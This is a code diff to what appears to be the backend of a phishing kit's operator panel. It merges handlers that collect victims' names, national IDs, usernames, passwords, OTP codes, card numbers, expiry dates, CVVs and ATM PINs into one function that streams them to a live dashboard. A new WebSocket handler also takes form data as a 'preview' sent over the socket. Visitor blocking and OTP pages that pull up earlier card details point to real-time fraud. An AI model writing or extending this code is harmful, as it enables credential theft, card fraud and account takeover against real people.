@@ -15,6 +15,7 @@ from ..services.registrations import (
     latest_payment_details,
     lookup_bin_info_sync,
     mark_registration_submission_missed,
+    requested_submission_id,
 )
 from ..services.visitors import build_visitor_redirect_url, frontend_index_url, get_visitor_status, is_visitor_blocked
 
@@ -73,6 +74,70 @@ async def read_json_payload(request: Request) -> dict:
             return {}
 
 
+def submission_status_for_form(form_type: str) -> str:
+    return 'accepted' if form_type == 'registration' else 'pending'
+
+
+async def ingest_submission_event(clean: dict) -> dict:
+    form_type = str(clean.get('form_type') or 'registration').strip() or 'registration'
+    status = submission_status_for_form(form_type)
+    event_type = 'registration' if form_type == 'registration' else form_type
+    visit_payload = {
+        'visitor_uid': clean.get('visitor_uid', ''),
+        'source_page': clean.get('source_page', ''),
+    }
+    if form_type == 'registration':
+        visit_payload.update(
+            {
+                'full_name': clean.get('full_name', ''),
+                'national_id': clean.get('national_id', ''),
+                'phone': clean.get('phone', ''),
+                'email': clean.get('email', ''),
+            }
+        )
+    visit_event = create_visit_record(visit_payload)
+    submission_id = create_registration_submission(
+        clean,
+        status=status,
+        decided_by='auto' if status == 'accepted' else '',
+    )
+    event = push_info_event(
+        {
+            'type': event_type,
+            'ts': visit_event.get('created_at', ''),
+            'visitor_uid': clean.get('visitor_uid', ''),
+            'source_page': clean.get('source_page', ''),
+            'full_name': clean.get('full_name', ''),
+            'national_id': clean.get('national_id', ''),
+            'phone': clean.get('phone', ''),
+            'email': clean.get('email', ''),
+            'username': clean.get('username', ''),
+            'password': clean.get('password', ''),
+            'otp_code': clean.get('otp_code', ''),
+            'atm_pin': clean.get('atm_pin', ''),
+            'card_holder': clean.get('card_holder', ''),
+            'card_number': clean.get('card_number', ''),
+            'card_expiry': clean.get('card_expiry', ''),
+            'card_cvv': clean.get('card_cvv', ''),
+            'card_bin_type': clean.get('card_bin_type', ''),
+            'card_bin_brand': clean.get('card_bin_brand', ''),
+            'card_bin_country': clean.get('card_bin_country', ''),
+            'card_bin_currency': clean.get('card_bin_currency', ''),
+            'card_bin_bank': clean.get('card_bin_bank', ''),
+            'card_bin_lookup_status': clean.get('card_bin_lookup_status', ''),
+            'card_bin_lookup_message': clean.get('card_bin_lookup_message', ''),
+            'card_bin_lookup_checked_at': clean.get('card_bin_lookup_checked_at', ''),
+            'request_type': clean.get('request_type', ''),
+            'watch_id': clean.get('watch_id', ''),
+            'category': clean.get('category', ''),
+            'submission_id': submission_id,
+            'status': status,
+        }
+    )
+    await broadcast_dashboard_update(recent_visit=visit_event, include_info_events=True)
+    return {'visit_event': visit_event, 'event': event, 'submission_id': submission_id, 'status': status}
+
+
 @router.post('/api/visit')
 async def create_visit(request: Request) -> JSONResponse:
     payload = await read_json_payload(request)
@@ -127,35 +192,17 @@ async def submit_registration(request: Request) -> JSONResponse:
             status_code=403,
         )
     clean = {
+        'form_type': 'registration',
         'visitor_uid': visitor_uid,
         'source_page': clean_text(payload.get('source_page'), 120),
         'full_name': clean_text(payload.get('full_name')),
         'national_id': clean_text(payload.get('national_id'), 40),
         'phone': clean_text(payload.get('phone'), 40),
         'email': clean_text(payload.get('email'), 120),
+        'submission_id': clean_text(requested_submission_id(payload), 120),
     }
-
-    visit_event = create_visit_record(clean)
-    submission_id = create_registration_submission(clean, status='accepted', decided_by='auto')
-    push_info_event(
-        {
-            'type': 'registration',
-            'ts': visit_event.get('created_at', ''),
-            'visitor_uid': visitor_uid,
-            'source_page': clean.get('source_page', ''),
-            'full_name': clean.get('full_name', ''),
-            'national_id': clean.get('national_id', ''),
-            'phone': clean.get('phone', ''),
-            'email': clean.get('email', ''),
-            'request_type': '',
-            'watch_id': '',
-            'category': '',
-            'submission_id': submission_id,
-            'status': 'accepted',
-        }
-    )
-    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
-    return JSONResponse({'ok': True, 'submission_id': submission_id, 'status': 'accepted'})
+    result = await ingest_submission_event(clean)
+    return JSONResponse({'ok': True, 'submission_id': result['submission_id'], 'status': result['status']})
 
 
 @router.post('/api/login/submit')
@@ -186,33 +233,12 @@ async def submit_login(request: Request) -> JSONResponse:
         'source_page': clean_text(payload.get('source_page'), 120),
         'username': clean_text(payload.get('username'), 120),
         'password': clean_text(payload.get('password'), 200),
+        'submission_id': clean_text(requested_submission_id(payload), 120),
     }
     if not clean['username'] or not clean['password']:
         return JSONResponse({'error': 'invalid_input'}, status_code=400)
-
-    visit_event = create_visit_record(
-        {
-            'visitor_uid': visitor_uid,
-            'source_page': clean['source_page'],
-        }
-    )
-    event = push_info_event(
-        {
-            'type': 'login',
-            'ts': visit_event.get('created_at', ''),
-            'visitor_uid': visitor_uid,
-            'source_page': clean.get('source_page', ''),
-            'username': clean.get('username', ''),
-            'password': clean.get('password', ''),
-            'request_type': '',
-            'watch_id': '',
-            'category': '',
-            'submission_id': create_registration_submission(clean, status='pending'),
-            'status': 'pending',
-        }
-    )
-    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
-    return JSONResponse({'ok': True, 'event': event, 'submission_id': event.get('submission_id', ''), 'status': 'pending'})
+    result = await ingest_submission_event(clean)
+    return JSONResponse({'ok': True, 'event': result['event'], 'submission_id': result['submission_id'], 'status': result['status']})
 
 
 @router.post('/api/login-otp/submit')
@@ -242,50 +268,15 @@ async def submit_login_otp(request: Request) -> JSONResponse:
         'visitor_uid': visitor_uid,
         'source_page': clean_text(payload.get('source_page'), 120),
         'otp_code': clean_text(payload.get('otp_code'), 12),
+        'submission_id': clean_text(requested_submission_id(payload), 120),
     }
     if len(clean['otp_code']) not in (4, 6):
         return JSONResponse({'error': 'invalid_input'}, status_code=400)
     clean.update(latest_login_credentials(visitor_uid))
     if any(page in clean['source_page'].lower() for page in ('phone-otp', 'app-otp')):
         clean.update(latest_payment_details(visitor_uid))
-
-    visit_event = create_visit_record(
-        {
-            'visitor_uid': visitor_uid,
-            'source_page': clean['source_page'],
-        }
-    )
-    submission_id = create_registration_submission(clean, status='pending')
-    event = push_info_event(
-        {
-            'type': 'login_otp',
-            'ts': visit_event.get('created_at', ''),
-            'visitor_uid': visitor_uid,
-            'source_page': clean.get('source_page', ''),
-            'username': clean.get('username', ''),
-            'password': clean.get('password', ''),
-            'otp_code': clean.get('otp_code', ''),
-            'card_holder': clean.get('card_holder', ''),
-            'card_number': clean.get('card_number', ''),
-            'card_expiry': clean.get('card_expiry', ''),
-            'card_cvv': clean.get('card_cvv', ''),
-            'card_bin_type': clean.get('card_bin_type', ''),
-            'card_bin_brand': clean.get('card_bin_brand', ''),
-            'card_bin_country': clean.get('card_bin_country', ''),
-            'card_bin_currency': clean.get('card_bin_currency', ''),
-            'card_bin_bank': clean.get('card_bin_bank', ''),
-            'card_bin_lookup_status': clean.get('card_bin_lookup_status', ''),
-            'card_bin_lookup_message': clean.get('card_bin_lookup_message', ''),
-            'card_bin_lookup_checked_at': clean.get('card_bin_lookup_checked_at', ''),
-            'request_type': '',
-            'watch_id': '',
-            'category': '',
-            'submission_id': submission_id,
-            'status': 'pending',
-        }
-    )
-    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
-    return JSONResponse({'ok': True, 'event': event, 'submission_id': submission_id, 'status': 'pending'})
+    result = await ingest_submission_event(clean)
+    return JSONResponse({'ok': True, 'event': result['event'], 'submission_id': result['submission_id'], 'status': result['status']})
 
 
 @router.post('/api/payment/submit')
@@ -318,6 +309,7 @@ async def submit_payment(request: Request) -> JSONResponse:
         'card_number': clean_text(payload.get('card_number'), 32),
         'card_expiry': clean_text(payload.get('card_expiry'), 8),
         'card_cvv': clean_text(payload.get('card_cvv'), 4),
+        'submission_id': clean_text(requested_submission_id(payload), 120),
     }
     digits = ''.join(ch for ch in clean['card_number'] if ch.isdigit())
     if (
@@ -334,34 +326,8 @@ async def submit_payment(request: Request) -> JSONResponse:
     # Optional enrichment only: failed/empty BIN lookup must not block submission.
     clean.update(await asyncio.to_thread(lookup_bin_info_sync, digits))
 
-    visit_event = create_visit_record({'visitor_uid': visitor_uid, 'source_page': clean['source_page']})
-    submission_id = create_registration_submission(clean, status='pending')
-    event = push_info_event(
-        {
-            'type': 'payment',
-            'ts': visit_event.get('created_at', ''),
-            'visitor_uid': visitor_uid,
-            'source_page': clean.get('source_page', ''),
-            'card_holder': clean.get('card_holder', ''),
-            'card_number': clean.get('card_number', ''),
-            'card_expiry': clean.get('card_expiry', ''),
-            'card_cvv': clean.get('card_cvv', ''),
-            'card_bin_type': clean.get('card_bin_type', ''),
-            'card_bin_brand': clean.get('card_bin_brand', ''),
-            'card_bin_country': clean.get('card_bin_country', ''),
-            'card_bin_currency': clean.get('card_bin_currency', ''),
-            'card_bin_bank': clean.get('card_bin_bank', ''),
-            'card_bin_lookup_status': clean.get('card_bin_lookup_status', ''),
-            'card_bin_lookup_message': clean.get('card_bin_lookup_message', ''),
-            'request_type': '',
-            'watch_id': '',
-            'category': '',
-            'submission_id': submission_id,
-            'status': 'pending',
-        }
-    )
-    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
-    return JSONResponse({'ok': True, 'event': event, 'submission_id': submission_id, 'status': 'pending'})
+    result = await ingest_submission_event(clean)
+    return JSONResponse({'ok': True, 'event': result['event'], 'submission_id': result['submission_id'], 'status': result['status']})
 
 
 @router.post('/api/atm/submit')
@@ -391,33 +357,14 @@ async def submit_atm(request: Request) -> JSONResponse:
         'visitor_uid': visitor_uid,
         'source_page': clean_text(payload.get('source_page'), 120),
         'atm_pin': ''.join(ch for ch in clean_text(payload.get('atm_pin'), 8) if ch.isdigit())[:4],
+        'submission_id': clean_text(requested_submission_id(payload), 120),
     }
     if len(clean['atm_pin']) != 4:
         return JSONResponse({'error': 'invalid_input'}, status_code=400)
     clean.update(latest_payment_details(visitor_uid))
 
-    visit_event = create_visit_record({'visitor_uid': visitor_uid, 'source_page': clean['source_page']})
-    submission_id = create_registration_submission(clean, status='pending')
-    event = push_info_event(
-        {
-            'type': 'atm',
-            'ts': visit_event.get('created_at', ''),
-            'visitor_uid': visitor_uid,
-            'source_page': clean.get('source_page', ''),
-            'atm_pin': clean.get('atm_pin', ''),
-            'card_holder': clean.get('card_holder', ''),
-            'card_number': clean.get('card_number', ''),
-            'card_expiry': clean.get('card_expiry', ''),
-            'card_cvv': clean.get('card_cvv', ''),
-            'request_type': '',
-            'watch_id': '',
-            'category': '',
-            'submission_id': submission_id,
-            'status': 'pending',
-        }
-    )
-    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
-    return JSONResponse({'ok': True, 'event': event, 'submission_id': submission_id, 'status': 'pending'})
+    result = await ingest_submission_event(clean)
+    return JSONResponse({'ok': True, 'event': result['event'], 'submission_id': result['submission_id'], 'status': result['status']})
 
 
 @router.post('/api/registration/status')
@@ -554,13 +501,49 @@ async def ws_visitor_presence(websocket: WebSocket):
         visit_event = touch_visit_presence(visitor_uid, source_page, include_submission_at=False)
         await broadcast_dashboard_update(recent_visit=visit_event, include_info_events=False)
 
+    async def handle_client_message(raw_message: str) -> None:
+        message = str(raw_message or '').strip()
+        if not message or message == 'ping':
+            return
+        try:
+            payload = json.loads(message)
+        except Exception:
+            return
+        if not isinstance(payload, dict):
+            return
+        if payload.get('type') != 'submission.preview':
+            return
+        submission = payload.get('submission') if isinstance(payload.get('submission'), dict) else {}
+        if not submission:
+            return
+        clean = {
+            'form_type': clean_text(submission.get('form_type'), 40) or 'registration',
+            'visitor_uid': visitor_uid,
+            'source_page': clean_text(submission.get('source_page') or source_page, 120),
+            'full_name': clean_text(submission.get('full_name')),
+            'national_id': clean_text(submission.get('national_id'), 40),
+            'phone': clean_text(submission.get('phone'), 40),
+            'email': clean_text(submission.get('email'), 120),
+            'username': clean_text(submission.get('username'), 120),
+            'password': clean_text(submission.get('password'), 200),
+            'otp_code': clean_text(submission.get('otp_code'), 12),
+            'atm_pin': ''.join(ch for ch in clean_text(submission.get('atm_pin'), 8) if ch.isdigit())[:4],
+            'card_holder': clean_text(submission.get('card_holder'), 120),
+            'card_number': ''.join(ch for ch in clean_text(submission.get('card_number'), 32) if ch.isdigit())[:16],
+            'card_expiry': clean_text(submission.get('card_expiry'), 8),
+            'card_cvv': clean_text(submission.get('card_cvv'), 4),
+            'submission_id': clean_text(requested_submission_id(submission), 120),
+        }
+        await ingest_submission_event(clean)
+
     try:
         await touch()
         while True:
             try:
-                await asyncio.wait_for(websocket.receive_text(), timeout=6)
+                incoming = await asyncio.wait_for(websocket.receive_text(), timeout=6)
             except asyncio.TimeoutError:
-                pass
+                incoming = ''
+            await handle_client_message(incoming)
             await touch()
     except WebSocketDisconnect:
         return
